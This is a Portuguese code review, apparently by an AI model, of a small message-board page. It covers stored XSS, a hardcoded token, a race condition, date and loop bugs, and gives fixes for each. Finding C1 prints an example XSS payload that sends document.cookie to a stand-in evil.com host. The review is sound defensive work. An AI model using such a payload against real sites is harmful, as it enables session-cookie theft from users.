# Review de Código — Mural de Recados

**Arquivos analisados:** `index.html`, `mural.js`  
**Data:** 2026-07-10  
**Revisor:** Claude Sonnet 4.6

---

## CRÍTICO

### C1 — XSS armazenado via `innerHTML` sem sanitização
**Arquivo:** `mural.js` — linhas 39–43  
**Problema:** O `innerHTML` é montado concatenando diretamente `r.autor`, `r.mensagem` e `r.quando` sem nenhum escape. Qualquer usuário pode publicar um recado com o conteúdo:
```
<img src=x onerror="fetch('https://evil.com/?c='+document.cookie)">
```
ou
```
<script>/* código malicioso */</script>
```
O payload é salvo no localStorage e **executado no navegador de todos** que abrirem o mural — XSS persistente clássico.  
**Como corrigir:** Trocar `innerHTML` por `textContent` nos campos de texto, ou criar os elementos via `document.createElement` + `textContent`:
```js
var spanAutor = document.createElement("span");
spanAutor.className = "autor";
spanAutor.textContent = r.autor;  // textContent escapa HTML automaticamente
```

---

### C2 — Credencial (`API_TOKEN`) hardcoded em JavaScript client-side
**Arquivo:** `mural.js` — linha 4  
**Problema:** `var API_TOKEN = "sk_live_[REDACTED-chave-fake-da-fixture]"` fica visível para qualquer pessoa que fizer View-Source ou abrir o DevTools. O prefixo `sk_live_` indica que é um token de produção. Qualquer pessoa pode roubar esse token e fazer chamadas à API de moderação em nome da aplicação.  
**Agravante adicional:** O token nunca é usado em nenhuma chamada de rede (ver M3 abaixo) — ou seja, expõe uma credencial sem nem prover a funcionalidade prometida.  
**Como corrigir:** Remover a variável do client. Chamadas a APIs de moderação devem passar por um backend próprio que guarda o token em variável de ambiente.

---

### C3 — Race condition: `setInterval` pode sobrescrever e apagar recado recém-enviado
**Arquivo:** `mural.js` — linhas 52–73  
**Problema:** O fluxo de envio tem uma janela de corrida real:

1. Usuário envia → `recados.push(novo)` (array na memória tem o recado novo)
2. `salvarNoServidor` agenda um `setTimeout` com delay **aleatório de 0–400 ms**
3. `render()` e `form.reset()` são chamados otimisticamente
4. Se o `setInterval` de 3 s disparar **antes** do `setTimeout` de `salvarNoServidor` concluir:
   - `carregarDoServidor()` lê o localStorage (que ainda não tem o novo recado) e **reassigna a variável global `recados`** para o array antigo
   - Quando o `setTimeout` finalmente dispara, ele faz `JSON.stringify(recados)` — mas `recados` agora aponta para o array antigo, sem o novo recado
   - O recado **é perdido silenciosamente**

O delay aleatório torna isso não-determinístico e difícil de reproduzir em testes rápidos.  
**Como corrigir:** Após salvar com sucesso, recarregar do localStorage em vez de fazer poll cego; ou proteger o save com uma flag `isSaving` que suspende o interval enquanto uma escrita está em andamento; ou usar a abordagem correta: só fazer `carregarDoServidor` quando o save já foi confirmado.

---

### C4 — Off-by-one: o primeiro recado (índice 0) nunca é exibido
**Arquivo:** `mural.js` — linha 35  
**Problema:** O loop de renderização usa `i > 0` como condição de parada:
```js
for (var i = recados.length - 1; i > 0; i--)
```
Isso faz o loop parar antes de chegar em `i === 0`, então o **recado mais antigo do array nunca é renderizado**. Para um mural recém-criado com apenas 1 mensagem, o mural aparece vazio.  
**Como corrigir:** Trocar `i > 0` por `i >= 0`.

---

## MÉDIO

### M1 — Mês exibido sempre errado (`getMonth()` retorna 0–11)
**Arquivo:** `mural.js` — linha 49  
**Problema:** `d.getMonth()` em JavaScript retorna de 0 (janeiro) a 11 (dezembro). O código usa o valor bruto:
```js
return d.getDate() + "/" + d.getMonth() + "/" + d.getFullYear();
```
Todos os recados publicados em julho aparecem como "10/6/2026" (junho), em dezembro como "25/11/2026", etc.  
**Como corrigir:** `d.getMonth() + 1`.

---

### M2 — Função de moderação `ehSpam` é código morto — nunca é chamada
**Arquivo:** `mural.js` — linhas 76–81  
**Problema:** A função `ehSpam` é definida mas não é invocada em lugar nenhum — nem no submit, nem no render, nem em nenhum outro ponto. Links e spam passam sem nenhum filtro. O comentário "moderação: marca como spam se o recado tiver link" é enganoso.  
**Como corrigir:** Chamar `ehSpam(novo)` dentro do handler de submit e rejeitar o recado (ou marcá-lo) se retornar `true`. Se a funcionalidade foi abandonada, remover a função e o `API_TOKEN` inteiramente.

---

### M3 — `API_TOKEN` declarada mas nunca usada em nenhuma chamada
**Arquivo:** `mural.js` — linha 4  
**Problema:** Além do risco de segurança (C2), o token é totalmente inútil: não existe nenhum `fetch`, `XMLHttpRequest` ou outra chamada que o utilize. A variável existe apenas para expor uma credencial.  
**Como corrigir:** Remover a variável. Se a integração com a API de moderação for implementada, fazê-lo via backend.

---

### M4 — IDs de recados podem se duplicar após reload do localStorage
**Arquivo:** `mural.js` — linha 55  
**Problema:** `id: recados.length + 1` calcula o ID com base no tamanho do array **na memória no momento do submit**. Se dois usuários (mesma máquina, abas diferentes) submeterem em sequência e cada um tiver carregado o estado inicial com N recados, ambos geram `id = N+1`. IDs duplicados causam bugs silenciosos em qualquer lógica futura de busca/remoção por ID.  
**Como corrigir:** Usar `Date.now()` ou `crypto.randomUUID()` como ID.

---

### M5 — Sem limite de tamanho nos campos de input
**Arquivo:** `index.html` — linhas 28–29  
**Problema:** Os campos `autor` e `mensagem` não têm atributo `maxlength`. Um usuário mal-intencionado pode submeter um payload de vários megabytes, estourando o limite de ~5 MB do localStorage e impedindo qualquer escrita futura (inclusive de outros usuários na mesma origem).  
**Como corrigir:** Adicionar `maxlength="100"` no campo autor e `maxlength="1000"` (ou similar) na textarea. Validar também no handler de submit.

---

### M6 — Feedback de status nunca reseta e não cobre estado de erro
**Arquivo:** `mural.js` — linhas 61–63  
**Problema:** O status fica em "Publicado!" indefinidamente. Se no futuro `salvarNoServidor` puder falhar, não há ramificação de erro — o usuário ficaria sem feedback. Também não há `try/catch` em volta do `JSON.stringify` (que pode lançar se o objeto tiver referências circulares).  
**Como corrigir:** Adicionar timeout para limpar o status após ~3 s; adicionar tratamento de erro com mensagem visível ao usuário.

---

## BAIXO

### B1 — `localStorage` não sincroniza entre usuários/navegadores diferentes
**Arquivo:** `mural.js` — linha 2 (comentário) e todo o design  
**Problema:** O comentário diz "Sincroniza com um backend fake via localStorage pra simular multiusuário", mas `localStorage` é isolado por origem **e por navegador**. Dois usuários em máquinas diferentes nunca veem os recados um do outro. Em produção, o mural seria uma experiência estritamente local — cada visitante vê apenas seus próprios recados.  
**Como corrigir:** Substituir por um backend real (API REST, Firebase Realtime Database, Supabase, etc.) antes de ir a produção.

---

### B2 — Comparação com `== -1` em vez de `=== -1`
**Arquivo:** `mural.js` — linha 77  
**Problema:** `recado.mensagem.indexOf("http") == -1` usa igualdade fraca. Não causa bug aqui pois `indexOf` só retorna números, mas é má prática que pode mascarar erros futuros.  
**Como corrigir:** Usar `=== -1` ou, melhor, `!recado.mensagem.includes("http")`.

---

### B3 — Uso de `var` com escopo de função em vez de `let`/`const`
**Arquivo:** `mural.js` — ao longo de todo o arquivo  
**Problema:** Todas as variáveis usam `var`, que tem escopo de função e sofre hoisting. Dentro do loop `for` em `render()`, `var r`, `var el` vazam para o escopo da função, o que pode causar bugs sutis em refactors futuros.  
**Como corrigir:** Substituir `var` por `const` (para valores que não mudam) e `let` (para variáveis reatribuídas).

---

### B4 — `setInterval` nunca é limpo
**Arquivo:** `mural.js` — linha 70  
**Problema:** O retorno de `setInterval` não é armazenado, então não há como cancelar o poll. Em frameworks que montam/desmontam componentes (ou se o script for carregado múltiplas vezes), os intervals se acumulam.  
**Como corrigir:** `var intervaloSync = setInterval(...)` e expor uma função de cleanup, ou — melhor — adotar um padrão de polling com `setTimeout` recursivo que possa ser cancelado.

---

## Resumo por Severidade

| Severidade | Qtd | Itens |
|------------|-----|-------|
| Crítico    | 4   | C1 (XSS), C2 (token exposto), C3 (race condition), C4 (off-by-one) |
| Médio      | 6   | M1 (mês errado), M2 (spam morto), M3 (token inútil), M4 (ID duplicado), M5 (sem maxlength), M6 (status sem erro) |
| Baixo      | 4   | B1 (localStorage ≠ multiusuário), B2 (==), B3 (var), B4 (interval sem cleanup) |

**Recomendação antes de ir a produção:** Os itens C1 e C2 são bloqueadores absolutos — XSS persistente em produção e token de API exposto no fonte. C3 e C4 tornam a funcionalidade básica não-confiável. Esses quatro devem ser resolvidos antes de qualquer deploy.
